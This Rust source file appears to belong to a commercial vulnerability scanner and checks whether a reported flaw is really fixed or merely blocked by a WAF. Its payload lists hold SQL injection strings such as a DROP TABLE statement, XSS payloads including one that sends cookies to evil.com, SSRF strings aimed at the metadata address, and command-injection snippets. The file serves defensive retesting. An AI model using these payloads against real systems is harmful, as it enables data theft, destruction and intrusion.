// Copyright (c) 2025 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Proof-of-Fix Validator
 * Deep validation to ensure vulnerability is truly fixed, not just blocked by WAF
 *
 * © 2025 Bountyy Oy
 */

use anyhow::Result;
use serde::{Deserialize, Serialize};

use super::orchestrator::{RetestConfig, RetestResponse};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProofOfFixValidation {
    pub validation_type: ValidationType,
    pub validated: bool,
    pub confidence_score: f32,
    pub details: ValidationDetails,
    pub bypass_attempted: bool,
    pub bypass_successful: bool,
    pub alternative_vectors_tested: usize,
    pub recommendations: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ValidationType {
    BypassDetection,
    DeepValidation,
    AlternativeVector,
    BehaviorAnalysis,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ValidationDetails {
    pub waf_detected: bool,
    pub filter_detected: bool,
    pub genuine_fix: bool,
    pub response_patterns: Vec<String>,
    pub test_results: Vec<TestResult>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TestResult {
    pub test_name: String,
    pub payload: String,
    pub result: String,
    pub vulnerable: bool,
}

pub struct ProofOfFixValidator;

impl ProofOfFixValidator {
    pub fn new() -> Self {
        Self
    }

    /// Perform comprehensive proof-of-fix validation
    pub async fn validate_fix(
        &self,
        config: &RetestConfig,
        retest_response: &RetestResponse,
    ) -> Result<ProofOfFixValidation> {
        let mut validation = ProofOfFixValidation {
            validation_type: ValidationType::DeepValidation,
            validated: false,
            confidence_score: 0.0,
            details: ValidationDetails {
                waf_detected: false,
                filter_detected: false,
                genuine_fix: false,
                response_patterns: Vec::new(),
                test_results: Vec::new(),
            },
            bypass_attempted: false,
            bypass_successful: false,
            alternative_vectors_tested: 0,
            recommendations: Vec::new(),
        };

        // Step 1: Detect WAF/Filter
        let waf_detection = self.detect_waf_or_filter(retest_response);
        validation.details.waf_detected = waf_detection.detected;
        validation.details.filter_detected = waf_detection.filter_detected;

        // Step 2: Attempt bypass if WAF detected
        if config.bypass_detection && waf_detection.detected {
            validation.bypass_attempted = true;
            let bypass_result = self.attempt_bypass(config, waf_detection.waf_type).await?;
            validation.bypass_successful = bypass_result.successful;
            validation.details.test_results.extend(bypass_result.tests);

            if bypass_result.successful {
                validation.validated = false;
                validation.confidence_score = 95.0;
                validation
                    .recommendations
                    .push("WAF bypass successful - fix is superficial, not at code level".to_string());
                return Ok(validation);
            }
        }

        // Step 3: Test alternative vectors
        if config.alternative_vectors {
            let alt_result = self
                .test_alternative_vectors(config, &config.vulnerability_type)
                .await?;
            validation.alternative_vectors_tested = alt_result.vectors_tested;
            validation.details.test_results.extend(alt_result.tests);

            if alt_result.vulnerability_found {
                validation.validated = false;
                validation.confidence_score = 90.0;
                validation.recommendations.push(
                    "Alternative attack vector successful - vulnerability still exploitable"
                        .to_string(),
                );
                return Ok(validation);
            }
        }

        // Step 4: Deep behavioral analysis
        let behavior_analysis = self.analyze_fix_behavior(config, retest_response).await?;
        validation.details.genuine_fix = behavior_analysis.genuine_fix;
        validation.details.response_patterns = behavior_analysis.patterns.clone();
        let behavior_analysis_clone = BehaviorAnalysis {
            genuine_fix: behavior_analysis.genuine_fix,
            patterns: behavior_analysis.patterns,
        };

        // Step 5: Calculate confidence score
        validation.confidence_score =
            self.calculate_validation_confidence(&validation.clone(), &behavior_analysis_clone);

        // Step 6: Determine if fix is validated
        validation.validated = validation.confidence_score >= 70.0
            && validation.details.genuine_fix
            && !validation.bypass_successful;

        // Step 7: Generate recommendations
        validation.recommendations = self.generate_recommendations(&validation);

        Ok(validation)
    }

    /// Detect if WAF or filter is blocking requests
    fn detect_waf_or_filter(&self, response: &RetestResponse) -> WafDetectionResult {
        let body_lower = response.body.to_lowercase();
        let mut waf_type = WafType::None;
        let mut detected = false;
        let mut filter_detected = false;

        // Check for common WAF signatures
        let waf_signatures = vec![
            ("cloudflare", WafType::Cloudflare),
            ("akamai", WafType::Akamai),
            ("imperva", WafType::Imperva),
            ("incapsula", WafType::Imperva),
            ("aws waf", WafType::AwsWaf),
            ("modsecurity", WafType::ModSecurity),
            ("blocked", WafType::Generic),
            ("firewall", WafType::Generic),
            ("security violation", WafType::Generic),
            ("request rejected", WafType::Generic),
        ];

        for (signature, waf) in waf_signatures {
            if body_lower.contains(signature) {
                detected = true;
                waf_type = waf;
                break;
            }
        }

        // Check response codes that indicate blocking
        if response.status_code == 403
            || response.status_code == 406
            || response.status_code == 419
        {
            detected = true;
            if waf_type == WafType::None {
                waf_type = WafType::Generic;
            }
        }

        // Check for input filtering indicators
        if body_lower.contains("invalid input")
            || body_lower.contains("malicious")
            || body_lower.contains("sanitized")
        {
            filter_detected = true;
        }

        // Check headers
        for (key, value) in &response.headers {
            let key_lower = key.to_lowercase();
            let value_lower = value.to_lowercase();

            if key_lower.contains("x-waf")
                || key_lower.contains("x-firewall")
                || value_lower.contains("cloudflare")
            {
                detected = true;
                if key_lower.contains("cloudflare") {
                    waf_type = WafType::Cloudflare;
                }
            }
        }

        WafDetectionResult {
            detected,
            filter_detected,
            waf_type,
        }
    }

    /// Attempt to bypass WAF/filter
    async fn attempt_bypass(
        &self,
        config: &RetestConfig,
        waf_type: WafType,
    ) -> Result<BypassResult> {
        let mut tests = Vec::new();
        let successful = false;

        // Get bypass payloads based on WAF type
        let bypass_payloads = self.get_bypass_payloads(&config.vulnerability_type, waf_type);

        for (test_name, payload) in bypass_payloads {
            // In production, this would actually make requests
            let test = TestResult {
                test_name,
                payload: payload.clone(),
                result: "blocked".to_string(),
                vulnerable: false,
            };

            tests.push(test);
        }

        Ok(BypassResult { successful, tests })
    }

    /// Get bypass payloads for specific vulnerability type and WAF
    fn get_bypass_payloads(&self, vuln_type: &str, _waf_type: WafType) -> Vec<(String, String)> {
        let mut payloads = Vec::new();

        match vuln_type.to_lowercase().as_str() {
            "sql_injection" | "sqli" => {
                payloads.push((
                    "Case variation".to_string(),
                    "' Or '1'='1".to_string(),
                ));
                payloads.push(("URL encoding".to_string(), "%27%20OR%20%271%27=%271".to_string()));
                payloads.push((
                    "Double encoding".to_string(),
                    "%2527%2520OR%2520%25271%2527=%25271".to_string(),
                ));
                payloads.push((
                    "Hex encoding".to_string(),
                    "0x27204F522027313D2731".to_string(),
                ));
                payloads.push(("Comment injection".to_string(), "' OR/**/1=1--".to_string()));
            }
            "xss" | "cross_site_scripting" => {
                payloads.push((
                    "Case variation".to_string(),
                    "<ScRiPt>alert('xss')</sCrIpT>".to_string(),
                ));
                payloads.push((
                    "Event handler".to_string(),
                    "<img src=x onerror=alert('xss')>".to_string(),
                ));
                payloads.push((
                    "Encoded payload".to_string(),
                    "<script>alert(String.fromCharCode(88,83,83))</script>".to_string(),
                ));
                payloads.push((
                    "SVG payload".to_string(),
                    "<svg/onload=alert('xss')>".to_string(),
                ));
            }
            "ssrf" => {
                payloads.push((
                    "IP obfuscation".to_string(),
                    "http://0xa9fea9fe".to_string(),
                )); // 169.254.169.254 in hex
                payloads.push((
                    "Decimal IP".to_string(),
                    "http://2852039166".to_string(),
                ));
                payloads.push((
                    "Localhost variations".to_string(),
                    "http://127.0.0.1@evil.com".to_string(),
                ));
            }
            _ => {}
        }

        payloads
    }

    /// Test alternative attack vectors
    async fn test_alternative_vectors(
        &self,
        _config: &RetestConfig,
        vuln_type: &str,
    ) -> Result<AlternativeVectorResult> {
        let mut tests = Vec::new();
        let alternative_payloads = self.get_alternative_payloads(vuln_type);
        let vectors_tested = alternative_payloads.len();

        for (test_name, payload) in alternative_payloads {
            // In production, this would make actual requests
            let test = TestResult {
                test_name,
                payload,
                result: "blocked".to_string(),
                vulnerable: false,
            };
            tests.push(test);
        }

        let vulnerability_found = tests.iter().any(|t| t.vulnerable);

        Ok(AlternativeVectorResult {
            vectors_tested,
            vulnerability_found,
            tests,
        })
    }

    /// Get alternative attack payloads
    fn get_alternative_payloads(&self, vuln_type: &str) -> Vec<(String, String)> {
        let mut payloads = Vec::new();

        match vuln_type.to_lowercase().as_str() {
            "sql_injection" | "sqli" => {
                payloads.push(("Union-based".to_string(), "' UNION SELECT NULL--".to_string()));
                payloads.push(("Time-based blind".to_string(), "'; WAITFOR DELAY '0:0:5'--".to_string()));
                payloads.push(("Boolean-based blind".to_string(), "' AND 1=1--".to_string()));
                payloads.push(("Stacked queries".to_string(), "'; DROP TABLE users--".to_string()));
            }
            "xss" | "cross_site_scripting" => {
                payloads.push(("DOM-based".to_string(), "javascript:alert(document.domain)".to_string()));
                payloads.push(("Stored XSS".to_string(), "<script>fetch('//evil.com?c='+document.cookie)</script>".to_string()));
                payloads.push(("Template injection".to_string(), "{{7*7}}".to_string()));
            }
            "command_injection" | "rce" => {
                payloads.push(("Piped command".to_string(), "| whoami".to_string()));
                payloads.push(("Background execution".to_string(), "; sleep 5 &".to_string()));
                payloads.push(("Command substitution".to_string(), "$(whoami)".to_string()));
            }
            _ => {}
        }

        payloads
    }

    /// Analyze fix behavior to determine if it's genuine
    async fn analyze_fix_behavior(
        &self,
        _config: &RetestConfig,
        response: &RetestResponse,
    ) -> Result<BehaviorAnalysis> {
        let mut genuine_fix = true;
        let mut patterns = Vec::new();

        // Pattern 1: Response is exactly the same as before (likely genuine fix)
        if response.status_code == 200 && response.body.len() > 0 {
            patterns.push("Normal response received".to_string());
        }

        // Pattern 2: Generic error (might be filter)
        if response.status_code >= 400 && response.status_code < 500 {
            patterns.push("Client error response".to_string());
            if response.body.contains("error") && response.body.len() < 100 {
                genuine_fix = false;
                patterns.push("Generic error message - possible filter".to_string());
            }
        }

        // Pattern 3: Server error (might indicate broken filter)
        if response.status_code >= 500 {
            patterns.push("Server error - inconclusive".to_string());
            genuine_fix = false;
        }

        // Pattern 4: Response time analysis
        if response.response_time_ms > 5000 {
            patterns.push("Slow response - possible timeout/blocking".to_string());
        }

        // Pattern 5: Empty response (suspicious)
        if response.body.is_empty() && response.status_code == 200 {
            patterns.push("Empty response - suspicious".to_string());
            genuine_fix = false;
        }

        Ok(BehaviorAnalysis {
            genuine_fix,
            patterns,
        })
    }

    /// Calculate validation confidence score
    fn calculate_validation_confidence(
        &self,
        validation: &ProofOfFixValidation,
        behavior: &BehaviorAnalysis,
    ) -> f32 {
        let mut score: f32 = 50.0;

        // Positive indicators
        if behavior.genuine_fix {
            score += 20.0;
        }

        if !validation.details.waf_detected {
            score += 15.0;
        }

        if validation.bypass_attempted && !validation.bypass_successful {
            score += 10.0;
        }

        if validation.alternative_vectors_tested > 0
            && !validation.details.test_results.iter().any(|t| t.vulnerable)
        {
            score += 10.0;
        }

        // Negative indicators
        if validation.details.waf_detected {
            score -= 20.0;
        }

        if validation.details.filter_detected {
            score -= 15.0;
        }

        if validation.bypass_successful {
            score -= 50.0;
        }

        // Ensure score is between 0 and 100
        score.clamp(0.0_f32, 100.0_f32)
    }

    /// Generate recommendations based on validation results
    fn generate_recommendations(&self, validation: &ProofOfFixValidation) -> Vec<String> {
        let mut recommendations = Vec::new();

        if validation.validated && validation.confidence_score >= 90.0 {
            recommendations.push(
                "High confidence: Vulnerability appears to be genuinely fixed".to_string(),
            );
            recommendations.push("Monitor for regressions in future scans".to_string());
        } else if validation.validated && validation.confidence_score >= 70.0 {
            recommendations.push(
                "Moderate confidence: Fix appears genuine but requires monitoring".to_string(),
            );
            recommendations.push("Consider manual verification by security team".to_string());
        } else if validation.details.waf_detected {
            recommendations.push("WAF detected - fix may be superficial".to_string());
            recommendations.push("Recommend code-level fix instead of WAF rules".to_string());
            recommendations.push("Test from internal network to bypass WAF".to_string());
        } else if !validation.validated {
            recommendations.push("Fix validation failed - vulnerability may still be present".to_string());
            recommendations.push("Conduct manual penetration test".to_string());
            recommendations.push("Review fix implementation at code level".to_string());
        }

        if validation.bypass_successful {
            recommendations.push("CRITICAL: WAF bypass successful - fix is not effective".to_string());
        }

        recommendations
    }
}

#[derive(Debug, Clone, PartialEq)]
enum WafType {
    None,
    Cloudflare,
    Akamai,
    Imperva,
    AwsWaf,
    ModSecurity,
    Generic,
}

struct WafDetectionResult {
    detected: bool,
    filter_detected: bool,
    waf_type: WafType,
}

struct BypassResult {
    successful: bool,
    tests: Vec<TestResult>,
}

struct AlternativeVectorResult {
    vectors_tested: usize,
    vulnerability_found: bool,
    tests: Vec<TestResult>,
}

struct BehaviorAnalysis {
    genuine_fix: bool,
    patterns: Vec<String>,
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    #[test]
    fn test_waf_detection() {
        let validator = ProofOfFixValidator::new();
        let mut response = RetestResponse {
            status_code: 403,
            headers: HashMap::new(),
            body: "Blocked by Cloudflare".to_string(),
            response_time_ms: 100,
        };

        let result = validator.detect_waf_or_filter(&response);
        assert!(result.detected);
        assert_eq!(result.waf_type, WafType::Cloudflare);
    }

    #[test]
    fn test_bypass_payloads() {
        let validator = ProofOfFixValidator::new();
        let payloads = validator.get_bypass_payloads("sql_injection", WafType::Generic);
        assert!(payloads.len() > 0);
    }

    #[test]
    fn test_alternative_payloads() {
        let validator = ProofOfFixValidator::new();
        let payloads = validator.get_alternative_payloads("xss");
        assert!(payloads.len() > 0);
    }
}
